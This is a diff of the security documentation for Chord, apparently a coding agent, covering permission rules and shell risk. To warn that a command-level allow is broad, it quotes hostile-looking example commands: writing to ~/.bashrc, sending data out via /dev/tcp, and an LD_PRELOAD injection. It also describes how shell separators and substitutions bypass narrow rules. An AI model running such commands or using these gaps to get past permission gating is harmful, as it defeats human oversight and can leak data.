@@ -4,6 +4,13 @@
 
 Chord is a coding agent that can read files, modify files, execute commands, and call external tools. Inspect actions before approving them. Permission rules control risk; they are not an operating-system sandbox.
 
+## How to use this page
+
+- **How rules are evaluated:** [Principles](#principles), [Permission model](#permission-model).
+- **Before allowing a command:** [Shell / shell risk](#shell--shell-risk) — `shell` is the broadest capability you can grant.
+- **Before allowing writes:** [File modification risk](#file-modification-risk).
+- **Credentials and remote surfaces:** [Credentials and config](#credentials-and-config), [Headless boundary](#headless-boundary), [Network and external integrations](#network-and-external-integrations).
+
 ## Principles
 
 - Keep high-risk actions as `ask` by default
@@ -53,7 +60,9 @@ permission:
     "git tag *": ask
 ```
 
-This means: allow most tools by default; disable `handoff` and `delegate`; require confirmation for file deletion, selected WebFetch URL patterns, and common high-risk shell/git commands. Permission rules use "last match wins", so the more specific `web_fetch` and `shell` rules above override the top-level `"*": allow`. This is reasonable for a single-user trusted workspace; shared repositories, team services, or automated headless deployments should tighten it further. This page starts from `"*": allow` as a trusted-workspace baseline; for a least-privilege baseline instead, the `builder` agent in [Configuration: Agent config](./configuration.md#agent-config) starts from `"*": deny` and opts in only to the tools a role needs.
+This means: allow most tools by default; disable `handoff` and `delegate`; require confirmation for file deletion, selected WebFetch URL patterns, and common high-risk shell/git commands. Permission rules use "last match wins", so the more specific `web_fetch` and `shell` rules above override the top-level `"*": allow`. This is reasonable for a single-user trusted workspace; shared repositories, team services, or automated headless deployments should tighten it further.
+
+This page starts from `"*": allow` as a trusted-workspace baseline; for a least-privilege baseline instead, the `builder` agent in [Configuration: Agent config](./configuration.md#agent-config) starts from `"*": deny` and opts in only to the tools a role needs.
 
 Permission matching examines the tool call and the session working directory (the directory the tool executes in). For `shell`, only the command string is matched — a `workdir` argument does not participate. For file tools (`read`, `write`, `edit`, `apply_patch`, `delete`, `view_image`), the target path is normalized against the working directory before rules are matched: a path inside the working directory is matched in cwd-relative form (so `foo.go`, `./foo.go`, and an absolute spelling of the same file all hit the same rule), while a path outside the working directory stays absolute.
 
@@ -121,13 +130,19 @@ Most tools use the literal `allow` / `ask` / `deny` meaning above, but a few orc
 
 > Permissions are Agent-level configuration, not a simple global switch.
 
-For `shell`, a specific `allow` pattern such as `"git *": allow` does not auto-allow a command that carries extra work: unquoted shell separators (`;`, `&&`, `||`, `|`, `&`, or newlines), command substitution (`$(...)` or backticks, including inside double quotes), and a quote the scan cannot resolve (an unterminated quote, or a trailing backslash). Those calls fall through to the next matching rule, typically `ask` or `deny`. Metacharacters that are literal payload — single-quoted, or escaped with a backslash — still match the narrow rule. Use this as a safety backstop, not as shell sandboxing; keep broad rules like `shell: allow` or `shell: { "*": allow }` for only fully trusted roles.
+For `shell`, a specific `allow` pattern such as `"git *": allow` does not auto-allow a command that carries extra work: unquoted shell separators (`;`, `&&`, `||`, `|`, `&`, or newlines), command substitution (`$(...)` or backticks, including inside double quotes), process substitution (`<(...)` or `>(...)`, which spawns a subcommand of its own), and a quote the scan cannot resolve (an unterminated quote, or a trailing backslash). Those calls fall through to the next matching rule, typically `ask` or `deny`.
 
-A command-specific `allow` does, however, cover the full capability of that command, including output redirections and inline environment-assignment prefixes. If `echo *` is allowed, then `echo secret > ~/.bashrc`, `echo x >> file`, `data > /dev/tcp/host/port`, and `LD_PRELOAD=./x.so echo hi` are all allowed — the redirection target and the environment prefix are part of that single shell command, not a separate tool call, so they are not matched or gated on their own. Grant a command-level `allow` only to commands whose worst case (arbitrary file writes via redirection, an overridden environment) you accept; otherwise keep them at `ask`.
+Metacharacters that are literal payload — single-quoted, or escaped with a backslash — still match the narrow rule. Use this as a safety backstop, not as shell sandboxing; keep broad rules like `shell: allow` or `shell: { "*": allow }` for only fully trusted roles.
+
+A command-specific `allow` does, however, cover the full capability of that command, including output redirections and inline environment-assignment prefixes. If `echo *` is allowed, then `echo secret > ~/.bashrc`, `echo x >> file`, `data > /dev/tcp/host/port`, and `LD_PRELOAD=./x.so echo hi` are all allowed — the redirection target and the environment prefix are part of that single shell command, not a separate tool call, so they are not matched or gated on their own.
+
+Grant a command-level `allow` only to commands whose worst case (arbitrary file writes via redirection, an overridden environment) you accept; otherwise keep them at `ask`.
 
 ## Shell / shell risk
 
-`shell` can execute system commands and should be treated carefully. `shell` is intentionally non-interactive whether the command runs in the foreground or as a background job: Chord does not wire model-controlled stdin into child processes, Unix child processes run without a controlling TTY, and high-confidence interactive commands are rejected before execution. Plain stdin reads such as shell `read`/`select` observe EOF instead of waiting for model input; provide data explicitly with a pipe, here-doc, file, or arguments when a command expects input. Login wizards, terminal editors, pagers/full-screen TUIs, password prompts, and commands that require `/dev/tty` should be run manually in a real terminal or rewritten with explicit non-interactive input/flags.
+`shell` can execute system commands and should be treated carefully. `shell` is intentionally non-interactive whether the command runs in the foreground or as a background job: Chord does not wire model-controlled stdin into child processes, Unix child processes run without a controlling TTY, and high-confidence interactive commands are rejected before execution.
+
+Plain stdin reads such as shell `read`/`select` observe EOF instead of waiting for model input; provide data explicitly with a pipe, here-doc, file, or arguments when a command expects input. Login wizards, terminal editors, pagers/full-screen TUIs, password prompts, and commands that require `/dev/tty` should be run manually in a real terminal or rewritten with explicit non-interactive input/flags.
 
 Platform notes for `shell` (foreground or background job):
 
